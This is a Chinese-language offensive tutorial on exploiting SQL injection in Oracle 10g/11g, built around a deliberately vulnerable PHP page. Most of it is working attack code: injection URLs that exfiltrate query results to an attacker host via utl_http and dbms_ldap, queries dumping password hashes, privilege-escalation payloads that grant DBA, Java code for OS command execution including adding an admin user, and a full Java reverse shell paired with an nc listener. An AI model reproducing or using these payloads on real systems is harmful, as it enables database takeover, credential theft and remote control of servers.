# Hacking Oracle with Sql Injection

0x0 前言 

0x1 信息刺探  

0x2 权限提升  

0x3 执行命令  

0x4 文件系统  

0x5 访问网络  

0x6 总结 

0x7 参考文献

**0x0 前言**

本文主要讨论如何通过一个sql inject 来最大限度的取得各种信息和权限，文章绝大多数技术都是前人提出，膜拜各位牛人 的同时，也非常感谢牛人们的分享，上帝与你们同在 ：） 本文仅起着总结作用，测试数据库分别为：Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 和Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 ，默认是 Oracle Database 10g Enterprise Edition Release 10.2.0.1.0最后，倘若您有更好的见解或者方法，请不吝赐教

**0x1 信息刺探**

通常刷到一个sql inject 之后，一般步骤都是查找敏感信息，oracle自带了很多数据字典，可以很方便我们查找信息

```
-- list version   select banner from v$version where rownum=1 ; -- oracle version

-- list user   select user from dual; -- current user   select username from user_users; -- current user   select username from all_users; -- all user , the current user can see...   select username from dba_users; -- all user , need pris

-- list role   select role from session_roles; -- current role

-- list privs   select privilege from user_sys_privs; -- privs the current user has   select privilege from role_sys_privs; -- privs the current role has   select privilege from session_privs; -- the all privs that current user has = user_sys_privs + role_sys_privs   select * from dba_sys_privs; -- all user's privs , need privs

-- list password hash   select name, password, astatus from sys.user$; -- password hash <=10g , need privs   select name, password, spare4 from sys.user$; -- password has 11g , need privs

-- list database   select global_name from global_name; -- current database   select sys.database_name from dual; -- current database   select name from v$database; -- current database name , need privs   select instance_name from v$instance; -- current database name , need privs

-- list schemas   select distinct owner from all_tables; -- all schema

-- list tables   select table_name from all_tables where owner='xxx'; -- all table name

-- list columns   select owner,table_name,column_name from all_tab_columns where table_name='xxx';   select owner,table_name,column_name from all_tab_cols where table_name='xxx';

```

一般思路就是检索schema->table->column ，然后就查询相关信息，进行下一步渗透，当然，倘若仅仅如此，这篇文章就 没有存在的必要了，下面我们会介绍怎么样通过web来hack oracle，不过在此之前，还是请容许我简单的描述一下在oracle 下如何高效的获取信息，下面这个是测试代码，本文通用代码

```
<?php  
//error_reporting(0); // do not display error info  
//include_once('db.php');  
$dbuser = 'hellove';  
$dbpass = 'hellove';  
$db= '';  
echo "<h3>Welcome to sql inject world!!! </h3>";  
$conn = oci_connect($dbuser,$dbpass,$db);

//get some data from mynew;  
if(empty($_GET['id']))  
$_GET['id'] = 1;  
$stmt = oci_parse($conn, "select id,content from mynews where id = ".$_GET['id']);  
oci_execute($stmt);  
oci_commit($conn);

$nrows = oci_fetch_all($stmt, $results);

if ($nrows > 0) {  
echo "<table border=\"1\">";  
echo "<tr>";  
foreach ($results as $key => $val) {  
echo "<th>$key</th>";  
}  
echo "</tr>";

      for ($i = 0; $i &lt; $nrows; $i++) {
          echo "&lt;tr&gt;&lt;br /&gt;";
          foreach ($results as $data) {
           echo "&lt;td&gt;$data[$i]&lt;/td&gt;";
          }
          echo "&lt;/tr&gt;";
     }
     echo "&lt;/table&gt;";


} else {  
echo "No data found<br />";  
}  
echo "$nrows Records Selected<br />";

oci_free_statement($stmt);  
oci_close($conn);

?>  

```

假定上面的代码是http://www.hellove.net/hellove.php，变量id将会导致注入. 在这里很明显的可以用union来获取信息，不过我们还是介绍一点oracle独有的获取信息的方法吧 

```
utl_http.request

local: nc.traditional -l -p 1234

web: http://www.hellove.net/hellove.php?id=123 and 1=utl_http.request('http://10.1.100.1/'||(SQL in HERE))  
utl_inaddr.get_host_name

error base  
web: http://www.hellove.net/hellove.php?id=123 and 1=utl_inaddr.get_host_name((SQL in HERE))  
utl_inaddr.get_host_address

error base or dns  
web: http://www.hellove.net/hellove.php?id=123 and 1=utl_inaddr.get_host_address((SQL in HERE))  
ctxsys.drithsx.sn

error base  
web: http://www.hellove.net/hellove.php?id=123 and 1=ctxsys.drithsx.sn(1,(SQL in HERE))  
sys.dbms_ldap.init

dns  
web: http://www.hellove.net/hellove.php?id=123 and SYS.DBMS_LDAP.INIT(((SQL in HERE)||'hellove.net',80) is not null

```

utl_http.request,utl_inaddr.get_host_name,utl_inaddr.get_host_address由于11g的安全特性无法继续使用，但是我们 可以在显错模式下利用ctxsys.drithsx.sn，或者自己搭建一个dnsserver，将一个域名的解析server指向该server，利用sys.dbms_ldap.init 还可以在11g下正常工作**0x2 权限提升**在这里假设我们得到的这个注射点所在的用户的拥有的权限很小，仅有create session或者其他权限，也假设我们并没有足够走运 能够注射到pl/sql语句中，仅仅是一个普普通通的注射点，这个时候我们就要想想如何提权了，所以本小结的主题是如何让我们现在 的用户成为dba，let’s begin DBMS_EXPORT_EXTENSION  现在我们来关注一下DBMS_EXPORT_EXTENSION这个包，这个包在06年7月之前存在3个危险函数，get_domain_index_metadata， get_v2_domain_index_tables，get_domain_index_tables，这三个函数sys定义，默认都是definer right ,oracle的初次 修复方案很友爱，前两个函数都修得差不多了，但是第三个在10g r2未打补丁的情况下，还存在着，让我们看一下这个函数的代码

```
FUNCTION GET_DOMAIN_INDEX_TABLES (  
INDEX_NAME IN VARCHAR2,  
INDEX_SCHEMA IN VARCHAR2,  
TYPE_NAME IN VARCHAR2,  
TYPE_SCHEMA IN VARCHAR2,  
READ_ONLY IN PLS_INTEGER,  
VERSION IN VARCHAR2,  
GET_TABLES IN PLS_INTEGER)  
RETURN VARCHAR2 IS

CRS INTEGER := DBMS_SQL.OPEN_CURSOR;  
DUMMY INTEGER;  
RETVAL INTEGER;  
STMTSTRING VARCHAR2(3901);  
COMPILE_ERROR EXCEPTION;  
PRAGMA EXCEPTION_INIT(COMPILE_ERROR, -6550);

BEGIN  
IF GET_TABLES = 1 THEN  
GETTABLENAMES_CONTEXT := 0;

STMTSTRING :=  
'DECLARE ' ||  
'oindexinfo ODCIIndexInfo := ODCIIndexInfo(' ||  
''''||SYS.DBMS_ASSERT.SCHEMA_NAME(INDEX_SCHEMA)||''','''||  
SYS.DBMS_ASSERT.SIMPLE_SQL_NAME(INDEX_NAME)||''', ' ||  
'ODCIColInfoList(), NULL, 0, 0); ' ||

'BEGIN ' ||  
':p1 := "' || SYS.DBMS_ASSERT.SCHEMA_NAME(TYPE_SCHEMA) || '"."' ||  
SYS.DBMS_ASSERT.SIMPLE_SQL_NAME(TYPE_NAME) ||  
'".ODCIIndexUtilGetTableNames(oindexinfo,:p2,:p3,:p4); ' ||  
'END;';  
DBMS_SQL.PARSE(CRS, STMTSTRING, DBMS_SYS_SQL.V7);  
DBMS_SQL.BIND_VARIABLE(CRS,':p1',STMTSTRING, 3901);  
DBMS_SQL.BIND_VARIABLE(CRS,':p2',READ_ONLY);  
DBMS_SQL.BIND_VARIABLE(CRS,':p3',VERSION,20);  
DBMS_SQL.BIND_VARIABLE(CRS,':p4',GETTABLENAMES_CONTEXT);  
DUMMY := DBMS_SQL.EXECUTE(CRS);  
DBMS_SQL.VARIABLE_VALUE(CRS, ':p1',STMTSTRING);  
DBMS_SQL.VARIABLE_VALUE(CRS, ':p4',GETTABLENAMES_CONTEXT);  
DBMS_SQL.CLOSE_CURSOR(CRS);  
ELSE  
STMTSTRING :=  
'BEGIN ' ||  
'"' || TYPE_SCHEMA || '"."' || TYPE_NAME ||  
'".ODCIIndexUtilCleanup(:p1); ' ||  
'END;';  
DBMS_SQL.PARSE(CRS, STMTSTRING, DBMS_SYS_SQL.V7);  
DBMS_SQL.BIND_VARIABLE(CRS,':p1',GETTABLENAMES_CONTEXT);  
DUMMY := DBMS_SQL.EXECUTE(CRS);  
DBMS_SQL.CLOSE_CURSOR(CRS);  
STMTSTRING := '';

END IF;

RETURN STMTSTRING;

EXCEPTION  
WHEN COMPILE_ERROR THEN  
DECLARE  
ERR_MSG VARCHAR2(520);  
BEGIN  
DBMS_SQL.CLOSE_CURSOR(CRS);  
ERR_MSG := SQLERRM(-6550);

IF INSTR(ERR_MSG, 'PLS-00302') != 0 THEN

RETURN '';  
ELSE  
RAISE;

END IF;  
END;

WHEN OTHERS THEN  
DBMS_SQL.CLOSE_CURSOR(CRS);  
RAISE;

END GET_DOMAIN_INDEX_TABLES; 

```

我们可以看到当GET_TABLES=1时，这代码无懈可击，但是当GET_TABLES=0时，TYPE_SCHEMA和TYPE_NAME就是注入点啊！突然觉得oracle觉得好可爱，这里我们就拿get_domain_index_tables演示

```
web: http://www.hellove.net/hellove.php?id=123 and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDX','SCH','DBMS_OUTPUT".PUT(:P1);execute immediate ''declare pragma autonomous_transaction; begin execute immediate ''''grant dba to hellove''''; end;''; END;--','SYS',1,'1',0)=0;

```

注射到第三参TYPE_NAME，熟悉pl/sql的都应该了解上面在干嘛：） 不过这个包的三个函数在06年7月之后就被修复了，也就是说 oracle 11g就不能再用了

> dbms_xmlquery.newcontext与dbms_xmlquery.getxml

我本来是还要写hacking oracle with pl/sql的，不过被这两个函数直接灭掉我这想法，这两个函数使得之前我以为仅能在pl/sql环境下利用的 漏洞，在web下也能利用了

```
dbms_xmlquery.getxml() public role  
dbms_xmlquery.newcontext() public role  
sys.kupp$proc.create_mater_process() dba role

```

这三个函数都可以直接执行PL/SQL语句，定义为invoker right ，所以使得之前只能在pl/sql环境中使用的漏洞，现在在web环境中也可以使用了，这三个函数应该都不算是存在漏洞，只能说是特性而已，后期会经常使用，现在提及一下

> DBMS_JVM_EXP_PERMS

DBMS_JVM_EXP_PERMS这个包比较好玩，纯粹是逻辑型的漏洞，所需的权限非常小，只要有create session就可以了，只可惜DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS不能在web环境中直接调用，作者给的poc能使我们的用户直接得到Java权限

```
DECLARE  
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;  
CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' from dual;  
BEGIN  
OPEN C1;  
FETCH C1 BULK COLLECT INTO POL;  
CLOSE C1;  
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);  
END;  

```

个人PL/SQL编程技术有限，尝试将上述poc用dbms_xmlquery.newcontext结合利用，不晓得为什么oracle老是提示ORA-03113: end-of-file on communication channel ,只能创建个函数，然后在通过函数进行利用，唉，结果又必须多一个create procedure权限才能利用 作者这个很厉害的漏洞，下面是我的代码

```
web: http://www.hellove.net/hellove.php?id=123 and dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;
 begin execute immediate ''create or replace function myjava return number is PRAGMA AUTONOMOUS_TRANSACTION;
 begin execute immediate ''''DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS 
 SELECT ''''''''GRANT'''''''',USER(), ''''''''SYS'''''''',''''''''java.io.FilePermission'''''''',
 ''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''',''''''''execute'''''''',''''''''ENABLED'''''''' from dual;BEGIN OPEN C1;
 FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;'''';commit;return 1;end;''; 
 commit; end;') is not null

web: http://www.hellove.net/hellove.php?id=123 and myjava()=1

```

由于The 11.2.0.1 April CPU patch fixes this，我的11g就没有测试成功，至于这个java.io的权限有什么用，后面再说， 反正先刷到一个权限再说 LT.FINDRICSET  first to first，看一下这个漏洞过程的代码

```
PROCEDURE FINDRICSET( TABLE_NAME VARCHAR2, RESULT_TABLE VARCHAR2 DEFAULT '' )  
IS  
TABOWNER VARCHAR2(100);  
TABNAME VARCHAR2(100);  
RESOWNER VARCHAR2(100);  
RESNAME VARCHAR2(100);  
BEGIN  
SYS.LT_CTX_PKG.SETUSER ;

     TABOWNER := NVL(SUBSTR(UPPER(TABLE_NAME),1,INSTR(TABLE_NAME,'.')-1), SYS_CONTEXT('lt_ctx', 'current_schema'));
     TABNAME  := SUBSTR(UPPER(TABLE_NAME),INSTR(TABLE_NAME,'.')+1);

     IF ( RESULT_TABLE IS NOT NULL ) THEN
        RESOWNER := NVL(SUBSTR(UPPER(RESULT_TABLE),1,INSTR(RESULT_TABLE,'.')-1), SYS_CONTEXT('lt_ctx', 'current_schema'));
        RESNAME  := SUBSTR(UPPER(RESULT_TABLE),INSTR(RESULT_TABLE,'.')+1);
     END IF;

      IF ( RESULT_TABLE IS NOT NULL AND 
           NOT HASOUTPUTTABPRIVS( RESOWNER, RESNAME ) ) THEN
         SYS.WM_ERROR.RAISEERROR(SYS.LT.WM_ERROR_171_NO, 'insufficient privileges on the result table');
      END IF;

     SYS.LTRIC.FINDRICSET( TABOWNER, TABNAME, RESOWNER, RESNAME );


END;  

```

粗略看一下似乎没什么问题，可是这个函数又调用了SYS.LTRIC.FINDRICSET,而SYS.LTRIC.FINDRICSET中存在注入，但是SYS.LTRIC.FINDRICSET 是不能被public角色调用，LT.FINDRICSET可以被public 角色调用，所以归为LT.FINDRICSET漏洞，再让我们看一下SYS.LTRIC.FINDRICSET的代码

```
PROCEDURE FINDRICSET( IN_TABLE_OWNER VARCHAR2, IN_TABLE_NAME VARCHAR2,  
RESULT_TABLE_OWNER VARCHAR2, RESULT_TABLE VARCHAR2 )  
.....省略  
EXECUTE IMMEDIATE 'insert into wmsys.wm$ric_set_in values ( ''' || IN_TABLE_OWNER || ''',''' || IN_TABLE_NAME || ''' )'; 

```

我们看到了IN_TABLE_NAME 和 IN_TABLE_OWNER 可以注入，但是IN_TABLE_NAME与IN_TABLE_OWNER都是由LT.FINDRICSET中的参数TABLE_NAME 所产生，所以我们可以用LT.FINDRICSET的第一参来进行注入，尝试结合dbms_xmlquery.newcontext(这样就无需create procedure)，结果因为 字数限制而失败了,下面给出利用方法，需要有create procedure的权限

```
web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;  
begin execute immediate ''create or replace function get_dba return varchar2 authid current_user is PRAGMA  
autonomous_transaction;BEGIN execute immediate ''''grant dba to hellove'''';commit;return ''''z'''';END; ''; commit; end;')  
from dual) is not null

web :http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext('declare PRAGMA  
AUTONOMOUS_TRANSACTION;begin sys.lt.findricset(''A.A''''||hellove.get_dba)--'',''BBBB'');commit;end;') from dual) is not  
null

```

上面两行代码是在web环境下使用的代码，pl/sql中更为简单，就不必演示了

> MDSYS.SDO_DROP_USER_BEFORE

之前的DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES属于函数注入，SYS.LTRIC.FINDRICSET属于过程注入，DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS逻辑问题 现在我们要介绍一个更为好玩的MDSYS.SDO_DROP_USER_BEFORE触发器，MDSYS模式下的SDO_DROP_USER_BEFORE，TRIGGER是以definer rigth来执行的，虽然MDSYS没有多大的权限 但是先让我们能够在MDSYS下执行任意命令，先看MDSYS.SDO_DROP_USER_BEFORE的代码

```
trigger sdo_drop_user_before  
before drop on DATABASE  
declare  
stmt varchar2(200);  
rdf_exception EXCEPTION; pragma exception_init(rdf_exception, -20000);  
BEGIN  
if dictionary_obj_type = 'USER' THEN  
BEGIN  
EXECUTE IMMEDIATE  
'begin ' ||  
'mdsys.rdf_apis_internal.' ||  
'notify_drop_user(''' ||  
dictionary_obj_name || '''); ' ||  
'end;';  
EXCEPTION  
WHEN rdf_exception THEN RAISE;  
WHEN OTHERS THEN NULL;  
END;  
end if;  
end;

```

dictionary_obj_name处可以注入，我们可以尝

```
SQL> set serveroutput on  
SQL> drop user "t');dbms_output.put_line('test";  
test  
drop user "t');dbms_output.put_line('test"  
*  
ERROR at line 1:  
ORA-01918: user 't');dbms_output.put_line('test' does not exist

```

相当无语，不过还是因为字数限制，不能利用dbms_xmlquery.getxml来实现无需create procedure，必须创建个过程，但是由于所在模式为MDSYS 不是dba，我们不能利用MDSYS直接获取dba权限，但是MDSYS拥有create any trigger的权限，所以我们可以利用MDSYS在system下 创建一个trigger，trigger是authid current_user,所以我们要利用trigger来在system权限下执行命令，然后我们再触发这个trigger,就可以 在system下执行代码了,talk is cheap,show me the code，直接放代码吧

```
create or replace procedure g(v varchar2) authid current_user is  
PRAGMA AUTONOMOUS_TRANSACTION;  
stmt varchar2(400) := 'create or replace trigger '  
|| 'system.evil_trigger '  
|| 'before insert on '  
|| 'system.OL$ '  
|| 'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;'  
|| 'BEGIN execute immediate ''grant dba to hellove'';END evil_trigger;';  
begin  
execute immediate stmt;  
commit;  
end; 

```

我们先创建一个过程g（名字要短）,方便注射到MDSYS.SDO_DROP_USER_BEFORE中，然后将g的执行权限赋给public，在过程g中，我们创建 一个在system模式OL$的trigger，代码如上

```
drop user "g');hellove.g('";  
insert into system.OL$(OL_NAME) values('test');  
set role dba

```

删除用户将触发触发器MDSYS.sdo_drop_user_before，注入代码以MDSYS模式下执行，而MDSYS可以create any trigger，所以我们利用MDSYS 创建system.OL$下的一个trigger，之所以是system.OL$，是因为public用户可以往里面插入数据而触发触发器，然后由于触发器是以definer来 运行的，所以创建的system.evil_trigger就以sysem的权限下加用户了,以上代码还是可以结合dbms_xmlquery.getxml来使用，请自行构造 简单分析了几个漏洞，由于oracle类似的漏洞太多了，不大可能一一分析，所以本小结到这就结束了**0x3 执行命令**下面的章节都假定我们已经获得了很高的权限，接下来我们的target就转移到了os，下面我们来讲一下如何在pl/sql中执行os命令

```
create or replace library exec_shell as '$ORACLE_HOME\bin\msvcrt.dll';  
create or replace procedure execmd (command in char) is external name "system" library exec_shell language c;  
/

exec execmd('net user > hellove.txt');  

```

直接照这上面的操作是必定会失败的，因为$ORACLE_HOME\bin\下压根就没msvcrt.dll，long long ago是可以用绝对地址”c:\windows\system32\msvcrt.dll”，或者用路径回溯”……\windows\system32\msvcrt.dll”来执行command的，不过在oracle 10gr2已经不行了，所以测试这个 代码的时候我是直接把msvcrt.dll复制到$ORACLE_HOME\bin\下，面对这种情况，我们可以利用PL/SQL来复制msvcrt.dll，或者用JAVA来执行命 令，我比较偏爱JAVA :)

```
create or replace and resolve java source named JAVACMD as  
import java.lang.*;  
import java.io.*;  
public class JAVACMD  
{  
public static void execmd(String command) throws IOException  
{  
Runtime.getRuntime().exec(command);  
}  
}

create or replace procedure MYJAVACMD(command in varchar) as language java  
name 'JAVACMD.execmd(java.lang.String)';

```

不过在执行这个MYJAVACMD之前必须将相应的JAVA权限赋予用户，之前提到的DBMS_JVM_EXP_PERMS就可以给用户赋予任意java权限，简单起见，我们直接赋予

```
exec dbms_java.grant_permission( 'HELLOVE', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute' );  
exec MYJAVACMD('net user');

```

突然发现我的题目是hacking oracle with sql inject，不是with pl/sql...让我们简单结合dbms_xmlquery.newcontext来在web下使用

```
web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;  
begin execute immediate ''create or replace and resolve java source named JAVACMD as import java.lang.*;import java.io.*;public  
class JAVACMD{public static void execmd(String command) throws IOException{Runtime.getRuntime().exec(command);}} ''; commit;  
end;') from dual) is not null

web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;  
begin execute immediate ''create or replace procedure MYJAVACMD(command in varchar) as language java name  
''''JAVACMD.execmd(java.lang.String)''''; ''; commit;end;') from dual) is not null

web :http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext('begin myjavacmd(''net user admin admin /add'')  
;commit;end;') from dual) is not null

```

由于用了dbms_xmlquery.newcontext之后，代码就惨不忍睹了，下面几篇就不结合dbms_xmlquery.newcontext来使用了，反正都懂的 :)

**0x4 文件系统**

下面我们将利用pl/sql来读取文件，其实获取dba权限之后，怎么样对系统进行操作完全就是个人pl/sql或java水平的体现

```
create or replace procedure read_file(dirname varchar2,fname varchar2) as  
FD utl_file.file_type;  
buffer varchar2(200);  
begin  
execute immediate 'create or replace directory rw_file as '''||dirname||'''';  
FD := utl_file.fopen('RW_FILE',fname,'r');  
dbms_output.enable(100000);  
loop  
sys.utl_file.get_line(FD,buffer);  
dbms_output.put_line(buffer);  
end loop;  
execute immediate 'drop directory rw_file';

exception  
when NO_DATA_FOUND then  
dbms_output.put_line('---|---|---|file end!---|---|---|---|');  
when others then  
dbms_output.put_line('please check your file');  
end read_file;  
/  
exec read_file('c:\','boot.ini');  

```

上面是PL/SQL代码来读取文件，下面是利用JAVA来读取文件内容

```
create or replace and compile java source named javareadfile as  
import java.lang.*;  
import java.io.*;  
public class javareadfile  
{  
public static void readfile(String filename) throws IOException  
{  
FileReader f = new FileReader(filename);  
BufferedReader fr = new BufferedReader(f);  
String text = fr.readLine();  
while(text != null)  
{  
System.out.println(text);  
text = fr.readLine();  
}  
fr.close();  
}  
}

create or replace procedure jreadfile (filename in varchar)  
as language java  
name 'javareadfile.readfile(java.lang.String)';

exec jreadfile('c:\boot.ini');

```

我们还是可以利用之前的那个DBMS_JVM_EXP_PERMS获取java.io.FilePermission，可以简单读取文件

**0x5 访问网络**

在PL/SQL中我们可以利用oracle自带的那几个包(utl_tcp,utl_http…etc)来访问网络，自我感觉不怎么好用，比较喜欢用java， 下面我们来实现一个简易的java版本反向后门

```
create or replace and compile java source named javasocket as  
import java.net.*;  
import java.io.*;  
import java.lang.*;

public class javasocket  
{  
public static void test(String addr,String str_port)  
{  
Socket socket;  
String len;  
String s;  
InputStream Is;  
OutputStream Os;  
DataInputStream DIS;  
PrintStream PS;

        try{ 
            socket=new Socket(addr,Integer.parseInt(str_port)); 
            Is=socket.getInputStream(); 
            Os=socket.getOutputStream(); 
            DIS=new DataInputStream(Is); 
            PS=new PrintStream(Os); 

            while(true){ 
                s=DIS.readLine();
                if(s.trim().equals("BYE"))break;

                try{
                    Runtime rt = Runtime.getRuntime();
                    Process p = null;
                    p = rt.exec(s);
                    s = null;
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String msg = null;
                    while((msg = br.readLine())!=null){
                            msg += "\n";
                            s += msg;
                    }
                    br.close();
                 }
                catch(Exception e)
                { 
                    s = "Please check your command!";
                } 

                PS.println(s);
           } 

            DIS.close();
            PS.close(); 
            Is.close(); 
            Os.close(); 
            socket.close();  
        } 
        catch(Exception e)
        { 
            System.out.println("Error:"+e); 
        } 
    } 


}

create or replace procedure myjavasocket(address in varchar,port in varchar) as language java  
name 'javasocket.test(java.lang.String,java.lang.String)';  

```

执行myjavasocket

```
exec myjavasocket('10.1.100.1','9999');

local: nc -l -p 9999

```

这样就可以得到了一个交互的shell了，不过有些不是exe文件的比如dir就得输入cmd.exe /c dir 来运行….

**0x6 总结**

其实这篇文章主要都是在讲10gr2，都是一些很老的东西，我也只是稍微的总结了一下，我现在更比较关注大牛们是怎么发现这些漏洞的， 这篇东西写了我差不多两周的时间，对oracle的了解从0到有了一点了解，从中学到了不少东西，本文参照了不少大牛的资料，再一次感谢和膜拜各位大牛

**0x7 参考文献**

[1] Hacking Oracle From Web 2 

[2] hacking Oracle From Web part2-2  

[3] HackingAurora  

[4] best of oracle security 2012  

[5] Integrigy Oracle SQL Injection Attacks  

[6] Oracle web环境注射技术
